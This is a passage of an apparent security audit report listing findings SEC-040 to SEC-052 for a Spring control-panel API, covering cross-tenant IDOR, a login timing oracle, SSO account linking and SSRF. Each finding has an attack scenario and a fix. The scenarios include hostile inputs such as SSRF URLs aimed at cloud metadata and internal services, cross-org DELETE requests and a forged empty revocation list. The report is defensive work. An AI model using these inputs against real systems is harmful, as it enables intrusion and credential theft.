The CRL endpoint returns a raw JSON object `{revokedSince, items[], generatedAt}` with no cryptographic signature (no JWS, detached signature, or MAC), unlike the licenses themselves which are Ed25519-signed JWTs. The controller does not even inject `KeyService`, so no signing path is wired in. The control panel already has Ed25519 signing keys (`LicenseIssuer`/`KeyService`) and a published JWKS, but the revocation list is not signed. The endpoint is unauthenticated and public (`@PreAuthorize("permitAll()")` plus an explicit entry in `SecurityConfig.java` line 69). Combined with the endpoint being served over whatever transport the deployment uses, any party able to respond to the client (MITM, compromised proxy/CDN, DNS hijack, malicious mirror) can substitute an empty or stale `items[]` list, and a client could not distinguish a forged CRL from the authentic one. (Latent: the license-verifier module currently contains zero revocation/CRL consumer code, and CRL consultation is marked Optional/online-only in the spec — so there is no end-to-end exploit path today; the vulnerability is real but latent.)

**Attack scenario:**
Once a CRL consumer exists, an attacker positioned on the path between the customer app and the control panel returns `{"items":[]}` for `/api/v1/licenses/revoked`. The client sees no revocations and treats every revoked license as valid, silently defeating revocation. Even without an active MITM, anyone can hit this public endpoint and observe it is unsigned, confirming it is forgeable.

**Recommended fix:**
Sign the CRL with the same Ed25519 signing key used for licenses and publish it as a signed object (e.g. a JWS / `crl+jwt` with `iat`, `nextUpdate`, and the revoked `jti` list as a claim, `kid` header for key selection). The consumer must verify the signature against the published JWKS before trusting it. Do not rely on TLS alone for an offline-verification product.

- [ ] Status: open

---

## [SEC-040] Usage ingest accepts events for ANY subscription from any authenticated user — cross-tenant quota poisoning

- **Severity:** MEDIUM
- **Dimension:** multitenancy-idor
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/usage/UsageIngestController.java` — `ingest()` L36-52 (no `@PreAuthorize`; body only `SecurityUtils.requireUser()`); `UsageIngestService.ingest()` L43-83 (resolves subscription solely from supplied `jti`, L51-57; upserts quota incrementing `consumed_value`, L88-94)

**Description:**
`POST /api/v1/usage/ingest` has NO `@PreAuthorize` and performs only `SecurityUtils.requireUser()`, which returns true for ANY authenticated principal (JWT control-panel users and org-scoped API keys alike) with no tenant/org binding. `UsageIngestService.ingest` resolves the target subscription SOLELY from the attacker-supplied `jti` via `tokenLookup.findByJti`, then writes `usage_events` and upserts `usage_quotas`, incrementing `consumed_value` (`ON CONFLICT ... consumed_value = consumed_value + EXCLUDED.consumed_value`). There is no check that the caller is associated with the subscription's owning org — a clear cross-tenant write IDOR. The rest of the codebase already has the exact mitigation (`Subscription.orgId`, `OrgMemberRepository`, the `@subAccess` bean with `isOrgMember`/`canReadSubscription`/`canDownloadLicense`), and every sibling endpoint enforces it (e.g. `LicenseController.download` maps a `jti` to its subscription for the check) — but `ingest` applies none. (Residual mitigation: enumerating victim `jti`s requires `subscription.read`/`license.issue` on the read endpoints; but a user privileged for their OWN org can still ingest against a known victim `jti`, and `jti`s are distributed to customer Docker apps and not treated as high-entropy secrets.)

**Attack scenario:**
An authenticated low-privilege user obtains a victim subscription's active `jti` (via an unscoped read finding or a `jti` they legitimately know) and POSTs large-quantity usage events for it, exhausting the victim's metered quota or corrupting their usage reporting/billing.

**Recommended fix:**
Bind ingest authorization to the resolved subscription's org: add `@PreAuthorize` org-membership scoping keyed off the `jti`'s subscription (e.g. `@subAccess` against a `@licenseLookup`-resolved subscriptionId, mirroring `LicenseController.download`), or authenticate ingest via the license/API-key tied to that subscription's org and verify the `jti` belongs to that org. At minimum verify the caller's org matches `token.subscriptionId`'s org before persisting.

- [ ] Status: open

---

## [SEC-041] API key revoke is not scoped to the path org — org admin can revoke another tenant's API keys (nested-resource IDOR)

- **Severity:** MEDIUM
- **Dimension:** multitenancy-idor
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/apikeys/ApiKeyController.java` — `revoke()` L46-51 (`@PreAuthorize` on `#orgId`); `ApiKeyService.revoke(id)` L84-93 (`repo.findById(id)` L86, no org check)

**Description:**
The route is `DELETE /api/v1/orgs/{orgId}/api-keys/{id}` and `@PreAuthorize("hasAuthority('apikey.write') or @orgAccess.isOwnerOrAdmin(#orgId)")` checks the caller against `{orgId}`. But `OrgAccessChecker.isOwnerOrAdmin(orgId)` only verifies the caller's role within the PATH `orgId` — it has no knowledge of the key's owning org — and the controller calls `service.revoke(id)` discarding `orgId` entirely. `ApiKeyService.revoke(id)` resolves the key by global primary key via `repo.findById(id)` and revokes it with no check that `key.getOrgId().equals(orgId)`. So an OWNER/ADMIN of their own org can revoke an API key belonging to a different org by passing their own `orgId` in the path and the victim org's key id. (The sibling `list()`/`create()` use the path `orgId` for data and are not exploitable; only the `{id}`-addressed revoke dereferences a global id without an ownership cross-check.)

**Attack scenario:**
Org-A owner calls `DELETE /api/v1/orgs/{orgA-id}/api-keys/{orgB-key-id}`. The `@PreAuthorize` passes (they own org A), and the service revokes org B's key, causing a denial of service for org B's integrations. (Requires knowing the victim's key id — a random UUID, not enumerable from the org context — which modestly raises the bar.)

**Recommended fix:**
In `ApiKeyService.revoke` load the key and assert `key.getOrgId().equals(orgId)` (404/403 otherwise), or query by `(orgId, id)`. Pass `orgId` from the controller into the service.

- [ ] Status: open

---

## [SEC-042] SSO provider delete/test are not scoped to the path org — cross-tenant SSO config access and tampering (nested-resource IDOR)

- **Severity:** MEDIUM
- **Dimension:** multitenancy-idor
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/sso/SsoController.java` — `delete()` L43-48 and `test()` L50-54; `SsoService.delete(id)` L63-69, `SsoService.test(id)` L71-92

**Description:**
Routes are `/api/v1/orgs/{orgId}/sso/{id}` (delete) and `/{id}/test`, both guarded only by `@PreAuthorize("hasAuthority('sso.write') or @orgAccess.isOwnerOrAdmin(#orgId)")`, where `isOwnerOrAdmin(orgId)` validates the caller's role solely against the PATH `orgId` and never ties it to the target provider. The controller does not even pass `orgId` into the service calls. `SsoService.delete(id)` does `repo.findById(id)` and never compares `p.getOrgId()` to `orgId`; `SsoService.test(id)` does `repo.findById(id)` then performs an outbound HTTP GET to the provider's stored issuer discovery URL (L80) or `metadataUrl` (L85) and returns ok/failure. No `getOrgId().equals(orgId)` check, interceptor, or filter exists in the sso package. The read path `list()` is correctly scoped via `findByOrgId(orgId)`, proving the pattern was available but not applied. So an OWNER/ADMIN of org A can delete or 'test' another org's SSO provider by supplying their own `orgId` and the victim provider id. (Requires knowing the victim provider's UUID — not trivially guessable.)

**Attack scenario:**
Org-A admin calls `DELETE /api/v1/orgs/{orgA-id}/sso/{orgB-provider-id}` to disable org B's SSO login (DoS to their login), or `POST .../{orgB-provider-id}/test` to probe org B's IdP endpoint (triggers an outbound request using org B's stored URL and leaks success/failure — info-disclosure / SSRF-adjacent).

**Recommended fix:**
Scope by org: `SsoService.delete/test` should accept `orgId` and assert `provider.getOrgId().equals(orgId)`, or query `findByIdAndOrgId`. Return 404 on mismatch.

- [ ] Status: open

---

## [SEC-043] Org-scoped permissions are unusable as tenant scoping because authorities are always resolved with orgId=null

- **Severity:** MEDIUM
- **Dimension:** multitenancy-idor
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/auth/JwtAuthFilter.java` — `doFilterInternal()` L60-73 (`authoritiesLoader.authoritiesFor(parsed.userId(), null, ...)`); `AuthController.login` L105; `PermissionService.permissionsFor` L28-50

**Description:**
Both at login (`AuthController` L105) and on every request (`JwtAuthFilter` L63 super-admin / L67 normal user) authorities are loaded with `orgId=null` — the only three callers of `authoritiesFor` all pass null. Per `PermissionService.permissionsFor` (L34-39), `orgId==null` returns ONLY assignments where `user_roles.org_id IS NULL` (global grants); the org-scoped branch (L40-48) is never exercised at runtime. The whole RBAC schema supports org-scoped role assignments (`user_roles.org_id`, 02-rbac.sql L36; `RbacController.assignRole` accepts an `orgId`), but those scoped grants never surface as authorities. Practical consequences: (1) a properly org-scoped admin gets NO permission authorities, so the system is pushed to grant powerful roles GLOBALLY (`org_id NULL`); and (2) write endpoints use bare `hasAuthority('subscription.write')`/`'license.issue'` with no org context, and `SubscriptionAccess.canReadSubscription/canDownloadLicense` short-circuit to true for any holder of `subscription.read`/`license.issue` regardless of org — so any global grant then satisfies the authority clauses for ALL orgs. The permission authorities are effectively platform-global despite the data model implying per-org scoping; this is the root enabler of the cross-tenant findings. (Architectural defect enabling cross-tenant access; realized via an operator's encouraged decision to grant globally.)

**Attack scenario:**
An operator intends to make a user an admin of a single org and assigns ORG_ADMIN; if assigned org-scoped it silently grants no permissions, so the operator (or the UI) assigns it globally to make it work — instantly giving `subscription.write`/`license.issue` across every tenant via the global-authority bypass paths.

**Recommended fix:**
Make resource-scoped `@PreAuthorize` checks depend on org membership/role (`OrgMember`) rather than flattened global authorities, OR resolve authorities per-target-org at check time (pass the path `orgId` / the resolved subscription's `orgId` into `permissionsFor`). Reserve global authorities strictly for super_admin/platform-staff. Audit existing `user_roles` for unintended `org_id=NULL` assignments of ORG_OWNER/ORG_ADMIN.

- [ ] Status: open

---

## [SEC-044] Login allows email enumeration via a bcrypt timing oracle (non-existent/suspended accounts skip password hashing)

- **Severity:** MEDIUM
- **Dimension:** password-bruteforce
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/auth/AuthController.java` — `login()` lines 88-101; `PasswordConfig.java` line 13 (`new BCryptPasswordEncoder(12)`)

**Description:**
In `login()` the code returns immediately when the user is not found (lines 89-92) or not ACTIVE (lines 94-97) WITHOUT ever calling `passwordEncoder.matches()`. Only for an existing ACTIVE user does it run the BCrypt(cost=12) verification at line 98, which is intentionally expensive (~100-300ms). The response BODY is masked identically ("Invalid email or password"), but the RESPONSE TIME is not: a request for a non-existent or suspended email returns in microseconds (a single DB lookup), while a request for a real active account incurs a full cost-12 bcrypt hash. There is no dummy/decoy-hash equalization anywhere. This is a reliable, statistically-measurable timing side channel for account enumeration. The lockout does not stop enumeration: `LoginAttempt` MAX_ATTEMPTS=5 over a 5-minute window, so a single probe per distinct email never reaches the threshold. (Contrast: the password-reset endpoint deliberately avoids leaking existence — developers were aware of enumeration concerns elsewhere.)

**Attack scenario:**
An attacker scripts `POST /api/v1/auth/login` with a fixed dummy password against a list of candidate emails and measures latency. Emails that consistently respond ~100-300ms slower correspond to real ACTIVE users. The attacker harvests a validated list of accounts to feed into password spraying or phishing.

**Recommended fix:**
Make the credential check constant-time with respect to account existence: when the user is absent or not ACTIVE, perform a dummy `passwordEncoder.matches()` against a fixed precomputed dummy bcrypt hash before returning the generic error, so every login path performs exactly one bcrypt comparison. Keep the response message identical (it already is).

- [ ] Status: open

---

## [SEC-045] Per-email lockout enables a victim-targeted denial-of-service (account lockout abuse)

- **Severity:** MEDIUM
- **Dimension:** password-bruteforce
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/auth/LoginAttempt.java` — `recordFailure()`/`isLocked()` lines 21-52; `AuthController.login()` lines 85-86

**Description:**
Lockout state is keyed solely on the lowercased email (no IP, device, or token). Thresholds are MAX_ATTEMPTS=5, WINDOW_SECONDS=300, LOCKOUT_SECONDS=900. In `AuthController.login()` the lockout is checked first (lines 85-86, throwing "Too many failed attempts; try again later") before any password verification, so a legitimate user with the CORRECT password is still denied during the 15-minute window. `recordFailure` is invoked on a nonexistent email, an inactive account, and a wrong password — so an unauthenticated attacker who merely knows/guesses a target email can submit 5 bad-password POSTs within 5 minutes to lock that email for 15 minutes, with no valid credentials required. `recordSuccess` only clears the counter on a successful login (which the locked-out victim cannot perform), so the attacker keeps the victim locked indefinitely by re-triggering every 15 minutes. There are no compensating controls — no captcha, no per-IP counter, no `getRemoteAddr`/X-Forwarded-For handling in the auth path. (Availability-only; self-healing 15 minutes after the attacker stops.)

**Attack scenario:**
An attacker who knows an admin's email (or harvested it via the enumeration timing oracle, SEC-044) sends 5 bad-password logins every 15 minutes, permanently keeping that admin (including super-admin) locked out of the control panel during an incident. A cheap, unauthenticated DoS against specific privileged users.

**Recommended fix:**
Do not block the legitimate user on email-only counters. Prefer per-IP throttling plus a step-up challenge (captcha) after N failures, and allow a correct password to succeed even when the per-email counter is high (e.g. lock the attacker's IP, not the account). If account lockout is retained, pair it with notification and a self-service unlock.

- [ ] Status: open

---

## [SEC-046] SSO JIT provisioning trusts unverified IdP email for account linking — latent account-takeover risk

- **Severity:** MEDIUM
- **Dimension:** sso-oidc
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/sso/SsoSuccessHandler.java` — `onAuthenticationSuccess` / `jitCreateUser` (lines 42-70, esp. 52-53); `SsoController.java` lines 36-41; `SsoSecurityConfig.java` lines 45-71

**Description:**
After a successful OIDC/SAML login, the handler extracts an email claim and does `userRepo.findByEmail(email)` against the GLOBAL `users` table (single table keyed by email, including the `super_admin` flag); if a user with that email already exists it logs in AS that existing user, otherwise it JIT-creates one. There is no binding between the authenticated SSO provider and the matched account, no `email_verified` check, and no restriction tying an IdP to the email domains it is allowed to assert. SSO providers are self-service: any org owner/admin can create one (`@orgAccess.isOwnerOrAdmin(#orgId)`) pointing at an IdP they fully control, and `SsoSecurityConfig` builds the OIDC ClientRegistration from an attacker-supplied `issuer`/`jwkSetUri`. The matched User is global and may be a `super_admin` or a member of a different org; `orgId` is only used to optionally ADD a membership, never to constrain WHICH account is logged in. **However**, the asserted critical-takeover impact does NOT actually hold in this codebase today: the chain is STATELESS and `/api/**` requires a Bearer HS256 token minted only by `SessionTokenService.issue(...)`, whose only caller is `AuthController.login` (password login). `SsoSuccessHandler` does NOT call `issue(...)`, sets no token/cookie, and only does `response.sendRedirect(uiBaseUrl + "?sso=success")`; the frontend never reads a token from `?sso=success`. So the OIDC dance matches/creates the privileged User row but no credential bound to that account is ever issued back to the attacker. The dangerous JIT trust logic genuinely exists and is a real latent defect that becomes a true account takeover the instant a token-issuing step is wired into the success handler.

**Attack scenario:**
A low-privilege org admin (owner of org B) registers an OIDC provider in their own org pointing at an IdP they control, then authenticates through it asserting `email = ceo@victim-corp.com` (or the platform super-admin email). Spring validates the token against the attacker's own issuer/JWKS, and the success handler resolves `findByEmail("ceo@victim-corp.com")` to the real privileged account. (As written today the exploit is broken at token issuance — no session credential is returned — but the matching logic already selects the privileged account.)

**Recommended fix:**
Bind SSO identities to a provider, not to a bare email: store and match on `(provider_id, IdP subject)` rather than email; on first link require the matched account to either not exist (true JIT) or to have explicitly opted into that provider. Restrict each provider to an allowlisted set of verified email domains and reject assertions whose email is outside them. Never allow an org-scoped provider to authenticate into a `super_admin` or another org's account. Require `email_verified=true` for OIDC. Treat JIT-created accounts as org-scoped, non-super-admin by construction and forbid promotion via SSO.

- [ ] Status: open

---

## [SEC-047] OIDC login does not require email_verified — provisioning/login on unverified email

- **Severity:** MEDIUM
- **Dimension:** sso-oidc
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/sso/SsoSuccessHandler.java` — `extractEmail` (lines 82-93) and `onAuthenticationSuccess` (52-53); `SsoSecurityConfig.java` lines 58-71

**Description:**
For OIDC principals the handler reads `o.getAttributes().getOrDefault("email", o.getName())` and uses it for account lookup/creation without checking the standard OIDC `email_verified` claim (a repo-wide grep for `email_verified` returns zero matches). `onAuthenticationSuccess` then does `userRepo.findByEmail(email)` and either matches an existing account or JIT-provisions a new one — making the raw `email` claim the sole authentication/identity key. `SsoSecurityConfig` registers OIDC clients with the default Spring `OidcUserService` and `userNameAttributeName("email")`; there is no custom user service that filters on verification, and there is no binding of the IdP `iss`/`sub` to the stored user record. Many OPs allow a user to set an arbitrary unverified email; combined with email-based account matching, an unverified email becomes an authentication identifier. (Gated on the configured IdP issuing unverified emails and the org admin having chosen that issuer — per-org trust — hence medium.)

**Attack scenario:**
At an IdP that lets users self-set an email without verification, an attacker sets their profile email to a victim's address. On SSO login the panel matches the victim's existing account (or provisions a new one under the victim's identity) because `email_verified` is never checked.

**Recommended fix:**
For OIDC, reject the login (or refuse to use the email for matching/provisioning) unless the token contains `email_verified == true`. Read it from `OAuth2User.getAttributes().get("email_verified")` and fail closed when absent.

- [ ] Status: open

---

## [SEC-048] extractEmail/extractName fall back to subject/NameID, allowing the IdP subject to be treated as an email identity

- **Severity:** MEDIUM
- **Dimension:** sso-oidc
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/sso/SsoSuccessHandler.java` — `extractEmail` lines 84-92; `jitCreateUser` lines 60-69

**Description:**
`extractEmail` does `o.getAttributes().getOrDefault("email", o.getName())` for OIDC (line 85), `firstNonNull(getFirstAttribute("email"), getFirstAttribute("mail"), s.getName())` for SAML (line 89, where `s.getName()` is the SAML NameID), and the catch-all returns `auth.getName()` (line 92). When the IdP omits an email claim, the principal name (SAML NameID / generic principal name) is used as the 'email' and persisted straight into the `email` column via `jitCreateUser` — which bypasses `UserService.createUser`, so there is NO email-format validation, normalization, or provider scoping. That value is then matched by `findByEmail` (line 52). `users.email` is a single global identity namespace (`email CITEXT UNIQUE NOT NULL`) shared by password login, password reset, and every org's SSO. The handler binds identity ONLY by the asserted string — there is no `provider_id+sub` binding and it does not verify the authenticating IdP is the one registered for the `orgId`. (Correction: for OIDC specifically, `userNameAttributeName("email")` means `o.getName()` returns the configured email attribute, not `sub` — the "OIDC sub" phrasing is imprecise; the weakness holds clearly for the SAML NameID path and the generic `auth.getName()` path. The UNIQUE constraint prevents duplicate rows but not the collision match.)

**Attack scenario:**
A federated IdP that asserts a NameID/sub equal to an existing user's email (e.g. NameID = `admin@victim.com`) will be matched to that existing account via `findByEmail` and granted org membership — an identity-collision / account-confusion across authentication mechanisms. Non-email NameIDs are also stored as "emails," polluting the user table with non-email login identifiers. (Requires a malicious/compromised federated IdP enrolled for an org, or an IdP that lets users influence their own NameID.)

**Recommended fix:**
Do not fall back to the principal name when an email claim is absent. If no validated email claim is present, refuse provisioning. Validate that the resolved value is a syntactically valid email and originated from the `email`/`mail` attribute, not the subject/NameID.

- [ ] Status: open

---

## [SEC-049] SSO success handler issues no session token and relies on an HTTP session that is disabled (STATELESS) — broken post-login state

- **Severity:** MEDIUM
- **Dimension:** sso-oidc
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/sso/SsoSuccessHandler.java` — `onAuthenticationSuccess` (45, 54, 57) + `extractOrgId` (108-112); `SecurityConfig.java` line 65 (`SessionCreationPolicy.STATELESS`)

**Description:**
The handler reads `request.getSession().getAttribute("sso.orgId")` (line 109) to decide org membership, but (a) nothing in the codebase ever writes `sso.orgId` — a project-wide grep finds only this reader and no writer mechanism — so `extractOrgId()` always returns null and `ensureMembership()` (gated by `if (orgId != null)`) never runs as intended (JIT-provisioned SSO users get no `OrgMember` row); and (b) the main SecurityFilterChain sets `SessionCreationPolicy.STATELESS` and the SSO handlers are registered on that very chain, so server-side session attributes are not a reliable carrier across the OAuth round trip. Moreover, on success the handler only does `response.sendRedirect(uiBaseUrl + "?sso=success")` (line 57) and never mints the application's own session JWT (`SsoSuccessHandler` holds no `SessionTokenService`), contrasting with `AuthController.login` which calls `tokenService.issue(...)` and returns the token. Under STATELESS there is no server session to hold the principal either, so the SPA has no usable credential after SSO. (A genuine broken/half-wired post-login flow — a functional gap, not a forged-token bypass; the speculative "tends to be fixed later by inserting user-controlled email into a token" tail claim is not present-day evidence.)

**Attack scenario:**
There is no working SSO login post-state: JIT users are never bound to their org (broken org auto-membership), and the SPA receives no credential. The risk is a half-wired flow likely to be "completed" later without the trust checks SEC-046/047/048 require. (Functional gap rather than a directly exploitable auth bypass — the handler issues no token at all rather than a forged one.)

**Recommended fix:**
Drive the org context from the validated provider/registrationId (which encodes the provider id `oidc-<id>` / `saml-<id>`, from which the owning org is known) rather than a session attribute. Mint the application session JWT in the success handler via `SessionTokenService` and hand it to the SPA over a secure, HttpOnly cookie or a one-time code exchange — never embed the IdP-asserted email in a token without applying the trust checks of SEC-046/047/048.

- [ ] Status: open

---

## [SEC-050] Server-side fetch of admin-supplied issuer/metadata URLs without allowlist (SSRF) — SSO test endpoint

- **Severity:** MEDIUM
- **Dimension:** sso-oidc
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/sso/SsoService.java` — `test()` lines 72-92 (`http.getForObject` on issuer/metadataUrl; `http` is a bare `new RestTemplate()` at line 26); `SsoSecurityConfig.relyingPartyRegistrationRepository` `fromMetadataLocation` (lines 103-108)

**Description:**
`SsoService.test()` builds a discovery/metadata URL directly from the admin-supplied `issuer`/`metadataUrl` config and fetches it with a default `RestTemplate` (no custom `ClientHttpRequestFactory`) — so there is no scheme allowlist, no host/IP filtering, and default redirect-following. `SsoSecurityConfig.relyingPartyRegistrationRepository()` similarly calls `RelyingPartyRegistrations.fromMetadataLocation(metadataUrl)` on the configured URL at bean bootstrap. A repo-wide grep for any SSRF mitigation (allowlist, loopback/link-local/169.254 filtering, `InetAddress` checks, redirect restriction, custom request factory) returned zero matches. The trust boundary is real: `SsoController.create/test` are gated by `hasAuthority('sso.write') or @orgAccess.isOwnerOrAdmin(#orgId)` (per-org ADMIN/OWNER) — an org admin is a customer, a lower trust tier than the server's network position. It is semi-blind (not fully blind) because `test()` returns `e.getMessage()` (line 90), leaking error/response details, and the SAML path parses fetched metadata into a live registration.

**Attack scenario:**
An org admin sets `issuer = http://169.254.169.254/latest/meta-data` (or an internal admin endpoint) and calls `POST /api/v1/orgs/{orgId}/sso/{id}/test`; the server makes the request from inside the trust boundary. Even though only success/failure and the exception message are returned, response timing and error content can be used to probe internal services; with redirect following this is a classic blind/semi-blind SSRF.

**Recommended fix:**
Restrict IdP URLs to https only, resolve and block private/link-local/loopback IP ranges before fetching, disable redirect following for metadata fetches, and consider routing IdP fetches through a dedicated egress proxy with an allowlist. Treat the test endpoint as SSRF-sensitive.

- [ ] Status: open

---

## [SEC-051] SSRF via stored SAML metadataUrl / OIDC endpoint URIs fetched by Spring Security from org-supplied config

- **Severity:** MEDIUM
- **Dimension:** ssrf-outbound
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/sso/SsoSecurityConfig.java` — `relyingPartyRegistrationRepository()` `RelyingPartyRegistrations.fromMetadataLocation(metadataUrl)` lines 99-108; `clientRegistrationRepository()` authorizationUri/tokenUri/userInfoUri/jwkSetUri lines 54-69; `SsoService.create` (no URL validation, lines 37-61); `SecurityConfig.java` lines 80-85 (permitAll start endpoints)

**Description:**
The SSO config persisted by org owners/admins is stored with no URL validation — `SsoService.create()` just serializes the org-supplied config map to JSON and saves it; no URL field is inspected. It is then consumed to build Spring Security registrations. For SAML, `RelyingPartyRegistrations.fromMetadataLocation(metadataUrl)` performs a synchronous server-side HTTP GET of the client-supplied `metadataUrl` with no scheme/host/IP restriction and no allowlist, automatically on every context startup/refresh for any enabled SAML row. For OIDC, the client-supplied `issuer`/authorizationUri/tokenUri/userInfoUri/jwkSetUri are wired into the ClientRegistration; tokenUri/userInfoUri/jwkSetUri are fetched server-side by Spring Security during the login code-exchange flow. The unauthenticated start endpoints (`/oauth2/authorization/**`, `/saml2/authenticate/**`, `/login/**`, `/saml2/service-provider-metadata/**`) are permitAll, so the outbound fetches can be triggered without panel authentication once a provider row exists (SAML metadata is also fetched unconditionally at startup). No mitigations exist (no `InetAddress`/loopback/site-local checks, no allowlist, no `ClientHttpRequestInterceptor`/`RestTemplateCustomizer`; bare `new RestTemplate()`). (Poisoning a provider requires an authenticated privileged actor — `sso.write` or org owner/admin — a semi-trusted tenant, distinct from the control-plane operator; the unauthenticated aspect applies only to triggering the fetch after a row exists.)

**Attack scenario:**
An org admin stores a SAML provider whose `metadataUrl` is `http://10.0.0.5:8500/v1/agent/self` (internal Consul) or `http://169.254.169.254/latest/meta-data/`. On the next application start/refresh the control plane fetches that internal URL while building the `RelyingPartyRegistrationRepository` bean (result/error surfaced in logs). For OIDC, the admin points tokenUri/userInfoUri at an internal service; triggering the public login start endpoint then causes the server to POST/GET those internal endpoints during the code exchange.

**Recommended fix:**
Apply outbound-URL validation/allowlist + IP-pinning at the point SSO config is accepted (`SsoService.create`) so no provider row can ever contain a non-public `metadataUrl`/`issuer`/tokenUri/userInfoUri/jwkSetUri. Validate scheme (https-only), resolved IP (reject loopback/private/link-local), and prefer an operator-maintained allowlist of permitted IdP domains. Additionally fetch SAML metadata through a hardened HTTP client (timeouts, no redirect to internal hosts) rather than the default `RestOperations` used by `RelyingPartyRegistrations`.

- [ ] Status: open

---

## [SEC-052] limit_value is never enforced — quota limits are decorative; ingestion never rejects over-limit usage

- **Severity:** MEDIUM
- **Dimension:** usage-quota
- **File(s)/location:** `control-panel-api/src/main/java/com/example/cp/usage/UsageIngestService.java` — `upsertQuota` lines 85-95 (inserts `limit_value` NULL, never reads it); `ingest()` lines 43-83; `UsageIngestController.java` line 89 (read-back into GET report)

**Description:**
There is no quota enforcement anywhere in the ingest path. `upsertQuota` always inserts `limit_value` as NULL (line 90) and its `ON CONFLICT DO UPDATE` only touches `consumed_value` and `period_end` — it never writes or reads `limit_value`. The `ingest()` method validates jti/token-active/feature_key, then unconditionally persists every event and accumulates the rollup; there is no branch comparing `consumed_value` to `limit_value` or rejecting over-limit usage. A whole-repo grep for `limit_value`/`limitValue` returns exactly four sites: the nullable schema column (07-usage.sql:23), the entity field (`UsageQuota.java:43-44`), the NULL insert (`UsageIngestService.java:89`), and a read-back into the GET report DTO (`UsageIngestController.java:89`). No code path ever sets a non-NULL limit or consults it to gate ingestion. The 'quota' is therefore purely a rollup counter. (Missing/absent business-and-abuse control rather than a direct privilege-escalation or data-exposure exploit; ingest already requires an authenticated user and a valid active jti.)

**Attack scenario:**
Because nothing reads `limit_value` during ingestion, a tenant can record unlimited usage of any feature regardless of any limit an operator might set. Any business control that depends on quota enforcement (metered billing caps, feature gating, abuse throttling) is non-functional. Combined with the missing ownership/replay/negative-value defenses (SEC-040 and related), usage data cannot be trusted for billing.

**Recommended fix:**
Decide and document where the limit comes from (plan/subscription), populate `limit_value` from the plan rather than NULL, and on ingest compare projected `consumed_value` against `limit_value`, rejecting or flagging over-limit events according to policy. If enforcement is intentionally out of scope for this service, remove `limit_value` from the model or clearly mark it informational to avoid a false sense of protection.

- [ ] Status: open
